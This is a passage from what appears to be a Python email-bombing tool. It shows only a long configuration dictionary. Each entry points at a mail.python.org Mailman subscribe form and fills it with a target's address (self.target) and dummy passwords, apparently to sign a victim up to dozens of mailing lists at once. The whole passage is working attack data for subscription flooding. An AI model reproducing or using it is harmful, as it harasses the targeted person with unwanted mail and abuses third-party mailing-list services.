                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YZQMe': {
                'url': 'https://mail.python.org/mailman/subscribe/i18n-sig',
                'token_url': 'https://mail.python.org/mailman/listinfo/i18n-sig',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Xzpsf': {
                'url': 'https://mail.python.org/mailman/subscribe/idle-dev',
                'token_url': 'https://mail.python.org/mailman/listinfo/idle-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MUQCp': {
                'url': 'https://mail.python.org/mailman/subscribe/image-sig',
                'token_url': 'https://mail.python.org/mailman/listinfo/image-sig',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RHxXj': {
                'url': 'https://mail.python.org/mailman/subscribe/import-sig',
                'token_url': 'https://mail.python.org/mailman/listinfo/import-sig',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vwwZa': {
                'url': 'https://mail.python.org/mailman/subscribe/inpycon',
                'token_url': 'https://mail.python.org/mailman/listinfo/inpycon',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GLFOC': {
                'url': 'https://mail.python.org/mailman/subscribe/ipython-dev',
                'token_url': 'https://mail.python.org/mailman/listinfo/ipython-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JfgAz': {
                'url': 'https://mail.python.org/mailman/subscribe/jython-checkins',
                'token_url': 'https://mail.python.org/mailman/listinfo/jython-checkins',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rGvyP': {
                'url': 'https://mail.python.org/mailman/subscribe/kolpy',
                'token_url': 'https://mail.python.org/mailman/listinfo/kolpy',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GqafC': {
                'url': 'https://mail.python.org/mailman/subscribe/mashhadpug',
                'token_url': 'https://mail.python.org/mailman/listinfo/mashhadpug',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WylpK': {
                'url': 'https://mail.python.org/mailman/subscribe/matplotlib-announce',
                'token_url': 'https://mail.python.org/mailman/listinfo/matplotlib-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cwexY': {
                'url': 'https://mail.python.org/mailman/subscribe/matplotlib-devel',
                'token_url': 'https://mail.python.org/mailman/listinfo/matplotlib-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lXGaD': {
                'url': 'https://mail.python.org/mailman/subscribe/matplotlib-users',
                'token_url': 'https://mail.python.org/mailman/listinfo/matplotlib-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Saszs': {
                'url': 'https://mail.python.org/mailman/subscribe/melbourne-pug',
                'token_url': 'https://mail.python.org/mailman/listinfo/melbourne-pug',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KlBsA': {
                'url': 'https://mail.python.org/mailman/subscribe/meta-sig',
                'token_url': 'https://mail.python.org/mailman/listinfo/meta-sig',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KpYnU': {
                'url': 'https://mail.python.org/mailman/subscribe/mobile-sig',
                'token_url': 'https://mail.python.org/mailman/listinfo/mobile-sig',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DvxPo': {
                'url': 'https://mail.python.org/mailman/subscribe/moin-devel',
                'token_url': 'https://mail.python.org/mailman/listinfo/moin-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AYOhW': {
                'url': 'https://mail.python.org/mailman/subscribe/moin-user',
                'token_url': 'https://mail.python.org/mailman/listinfo/moin-user',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OZNEr': {
                'url': 'https://mail.python.org/mailman/subscribe/multiprocessing-sig',
                'token_url': 'https://mail.python.org/mailman/listinfo/multiprocessing-sig',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'idLTp': {
                'url': 'https://mail.python.org/mailman/subscribe/ncr-python.in',
                'token_url': 'https://mail.python.org/mailman/listinfo/ncr-python.in',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LTqrA': {
                'url': 'https://mail.python.org/mailman/subscribe/neuroimaging',
                'token_url': 'https://mail.python.org/mailman/listinfo/neuroimaging',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LKKms': {
                'url': 'https://mail.python.org/mailman/subscribe/new-bugs-announce',
                'token_url': 'https://mail.python.org/mailman/listinfo/new-bugs-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uHVvs': {
                'url': 'https://mail.python.org/mailman/subscribe/newsletter',
                'token_url': 'https://mail.python.org/mailman/listinfo/newsletter',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JugWL': {
                'url': 'https://mail.python.org/mailman/subscribe/numpy-discussion',
                'token_url': 'https://mail.python.org/mailman/listinfo/numpy-discussion',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WLUvD': {
                'url': 'https://mail.python.org/mailman/subscribe/numpy-svn',
                'token_url': 'https://mail.python.org/mailman/listinfo/numpy-svn',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fPxEF': {
                'url': 'https://mail.python.org/mailman/subscribe/omaha',
                'token_url': 'https://mail.python.org/mailman/listinfo/omaha',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qYIzn': {
                'url': 'https://mail.python.org/mailman/subscribe/oscon',
                'token_url': 'https://mail.python.org/mailman/listinfo/oscon',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YfVHG': {
                'url': 'https://mail.python.org/mailman/subscribe/pandas-dev',
                'token_url': 'https://mail.python.org/mailman/listinfo/pandas-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sZDQV': {
                'url': 'https://mail.python.org/mailman/subscribe/planet',
                'token_url': 'https://mail.python.org/mailman/listinfo/planet',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ALXYe': {
                'url': 'https://mail.python.org/mailman/subscribe/playground',
                'token_url': 'https://mail.python.org/mailman/listinfo/playground',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QoNmn': {
                'url': 'https://mail.python.org/mailman/subscribe/plgroups',
                'token_url': 'https://mail.python.org/mailman/listinfo/plgroups',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HoOxk': {
                'url': 'https://mail.python.org/mailman/subscribe/plpug',
                'token_url': 'https://mail.python.org/mailman/listinfo/plpug',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ppdoU': {
                'url': 'https://mail.python.org/mailman/subscribe/plpug-audit',
                'token_url': 'https://mail.python.org/mailman/listinfo/plpug-audit',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'drzOE': {
                'url': 'https://mail.python.org/mailman/subscribe/plpug-board',
                'token_url': 'https://mail.python.org/mailman/listinfo/plpug-board',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HRZsJ': {
                'url': 'https://mail.python.org/mailman/subscribe/portland',
                'token_url': 'https://mail.python.org/mailman/listinfo/portland',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SYZZU': {
                'url': 'https://mail.python.org/mailman/subscribe/psf-community',
                'token_url': 'https://mail.python.org/mailman/listinfo/psf-community',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gcsTp': {
                'url': 'https://mail.python.org/mailman/subscribe/psf-supporting-members',
                'token_url': 'https://mail.python.org/mailman/listinfo/psf-supporting-members',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KtPRj': {
                'url': 'https://mail.python.org/mailman/subscribe/psf-ux',
                'token_url': 'https://mail.python.org/mailman/listinfo/psf-ux',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ETJcL': {
                'url': 'https://mail.python.org/mailman/subscribe/psf-volunteers',
                'token_url': 'https://mail.python.org/mailman/listinfo/psf-volunteers',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mzAnl': {
                'url': 'https://mail.python.org/mailman/subscribe/psf-vote',
                'token_url': 'https://mail.python.org/mailman/listinfo/psf-vote',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wLcYO': {
                'url': 'https://mail.python.org/mailman/subscribe/puppy',
                'token_url': 'https://mail.python.org/mailman/listinfo/puppy',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XLNDB': {
                'url': 'https://mail.python.org/mailman/subscribe/pycon-announce',
                'token_url': 'https://mail.python.org/mailman/listinfo/pycon-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XSpcP': {
                'url': 'https://mail.python.org/mailman/subscribe/pycon-de',
                'token_url': 'https://mail.python.org/mailman/listinfo/pycon-de',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RlYAq': {
                'url': 'https://mail.python.org/mailman/subscribe/pycon-disabilityservices',
                'token_url': 'https://mail.python.org/mailman/listinfo/pycon-disabilityservices',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WApwP': {
                'url': 'https://mail.python.org/mailman/subscribe/pycon-greenroom',
                'token_url': 'https://mail.python.org/mailman/listinfo/pycon-greenroom',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ChYVg': {
                'url': 'https://mail.python.org/mailman/subscribe/pycon-interest',
                'token_url': 'https://mail.python.org/mailman/listinfo/pycon-interest',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PORDp': {
                'url': 'https://mail.python.org/mailman/subscribe/pycon-mobile-guide',
                'token_url': 'https://mail.python.org/mailman/listinfo/pycon-mobile-guide',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kUvop': {
                'url': 'https://mail.python.org/mailman/subscribe/pycon-openspaces',
                'token_url': 'https://mail.python.org/mailman/listinfo/pycon-openspaces',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hPYWf': {
                'url': 'https://mail.python.org/mailman/subscribe/pycon-organizers',
                'token_url': 'https://mail.python.org/mailman/listinfo/pycon-organizers',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nICJl': {
                'url': 'https://mail.python.org/mailman/subscribe/pycon-pune',
                'token_url': 'https://mail.python.org/mailman/listinfo/pycon-pune',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bEqfB': {
                'url': 'https://mail.python.org/mailman/subscribe/pycon-se',
                'token_url': 'https://mail.python.org/mailman/listinfo/pycon-se',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RqTOz': {
                'url': 'https://mail.python.org/mailman/subscribe/pycon-tech',
                'token_url': 'https://mail.python.org/mailman/listinfo/pycon-tech',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NrXTG': {
                'url': 'https://mail.python.org/mailman/subscribe/pycon-us-announce',
                'token_url': 'https://mail.python.org/mailman/listinfo/pycon-us-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HIfnj': {
                'url': 'https://mail.python.org/mailman/subscribe/pycon-za',
                'token_url': 'https://mail.python.org/mailman/listinfo/pycon-za',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UibjE': {
                'url': 'https://mail.python.org/mailman/subscribe/pyconapac',
                'token_url': 'https://mail.python.org/mailman/listinfo/pyconapac',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QQOiH': {
                'url': 'https://mail.python.org/mailman/subscribe/pyconpl',
                'token_url': 'https://mail.python.org/mailman/listinfo/pyconpl',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IYpxL': {
                'url': 'https://mail.python.org/mailman/subscribe/pyconpl-org',
                'token_url': 'https://mail.python.org/mailman/listinfo/pyconpl-org',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EKZHE': {
                'url': 'https://mail.python.org/mailman/subscribe/pyconpl-prog',
                'token_url': 'https://mail.python.org/mailman/listinfo/pyconpl-prog',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QVozj': {
                'url': 'https://mail.python.org/mailman/subscribe/pyconscot',
                'token_url': 'https://mail.python.org/mailman/listinfo/pyconscot',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ynUTF': {
                'url': 'https://mail.python.org/mailman/subscribe/pyconuk',
                'token_url': 'https://mail.python.org/mailman/listinfo/pyconuk',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MYpIn': {
                'url': 'https://mail.python.org/mailman/subscribe/pyconuk-delegates',
                'token_url': 'https://mail.python.org/mailman/listinfo/pyconuk-delegates',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bcHUT': {
                'url': 'https://mail.python.org/mailman/subscribe/pyconuk-intro',
                'token_url': 'https://mail.python.org/mailman/listinfo/pyconuk-intro',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bvIHw': {
                'url': 'https://mail.python.org/mailman/subscribe/pydotorg-www',
                'token_url': 'https://mail.python.org/mailman/listinfo/pydotorg-www',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KXJKl': {
                'url': 'https://mail.python.org/mailman/subscribe/pygui',
                'token_url': 'https://mail.python.org/mailman/listinfo/pygui',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pSmlB': {
                'url': 'https://mail.python.org/mailman/subscribe/pyladies-blr',
                'token_url': 'https://mail.python.org/mailman/listinfo/pyladies-blr',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KvXHW': {
                'url': 'https://mail.python.org/mailman/subscribe/pyohio',
                'token_url': 'https://mail.python.org/mailman/listinfo/pyohio',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YmyYL': {
                'url': 'https://mail.python.org/mailman/subscribe/pyohio-announce',
                'token_url': 'https://mail.python.org/mailman/listinfo/pyohio-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AoAcb': {
                'url': 'https://mail.python.org/mailman/subscribe/pyop',
                'token_url': 'https://mail.python.org/mailman/listinfo/pyop',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IqLEm': {
                'url': 'https://mail.python.org/mailman/subscribe/pyopenssl-users',
                'token_url': 'https://mail.python.org/mailman/listinfo/pyopenssl-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QSFIv': {
                'url': 'https://mail.python.org/mailman/subscribe/pypi-checkins',
                'token_url': 'https://mail.python.org/mailman/listinfo/pypi-checkins',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DKnrv': {
                'url': 'https://mail.python.org/mailman/subscribe/pypy-commit',
                'token_url': 'https://mail.python.org/mailman/listinfo/pypy-commit',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hmMPD': {
                'url': 'https://mail.python.org/mailman/subscribe/pypy-dev',
                'token_url': 'https://mail.python.org/mailman/listinfo/pypy-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TEZkN': {
                'url': 'https://mail.python.org/mailman/subscribe/pypy-issue',
                'token_url': 'https://mail.python.org/mailman/listinfo/pypy-issue',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WyeIO': {
                'url': 'https://mail.python.org/mailman/subscribe/pysilesia',
                'token_url': 'https://mail.python.org/mailman/listinfo/pysilesia',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xFjcK': {
                'url': 'https://mail.python.org/mailman/subscribe/pystok',
                'token_url': 'https://mail.python.org/mailman/listinfo/pystok',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AgVrb': {
                'url': 'https://mail.python.org/mailman/subscribe/pytest-commit',
                'token_url': 'https://mail.python.org/mailman/listinfo/pytest-commit',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fOSzf': {
                'url': 'https://mail.python.org/mailman/subscribe/pytest-dev',
                'token_url': 'https://mail.python.org/mailman/listinfo/pytest-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FFqtn': {
                'url': 'https://mail.python.org/mailman/subscribe/python-africa',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-africa',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tgeLn': {
                'url': 'https://mail.python.org/mailman/subscribe/python-authors',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-authors',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ihVsF': {
                'url': 'https://mail.python.org/mailman/subscribe/python-bugs-list',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-bugs-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZPaBg': {
                'url': 'https://mail.python.org/mailman/subscribe/python-checkins',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-checkins',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XJTCk': {
                'url': 'https://mail.python.org/mailman/subscribe/python-compilers',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-compilers',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fDuon': {
                'url': 'https://mail.python.org/mailman/subscribe/python-crypto',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-crypto',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RtuwZ': {
                'url': 'https://mail.python.org/mailman/subscribe/python-cuba',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-cuba',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iuhUB': {
                'url': 'https://mail.python.org/mailman/subscribe/python-de',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-de',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pgBKG': {
                'url': 'https://mail.python.org/mailman/subscribe/python-es',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-es',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pTAXY': {
                'url': 'https://mail.python.org/mailman/subscribe/python-events',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-events',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hqvvA': {
                'url': 'https://mail.python.org/mailman/subscribe/python-greece',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-greece',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XQpjE': {
                'url': 'https://mail.python.org/mailman/subscribe/python-help',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-help',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kZSHe': {
                'url': 'https://mail.python.org/mailman/subscribe/python-hpc',
                'token_url': 'https://mail.python.org/mailman/listinfo/python-hpc',
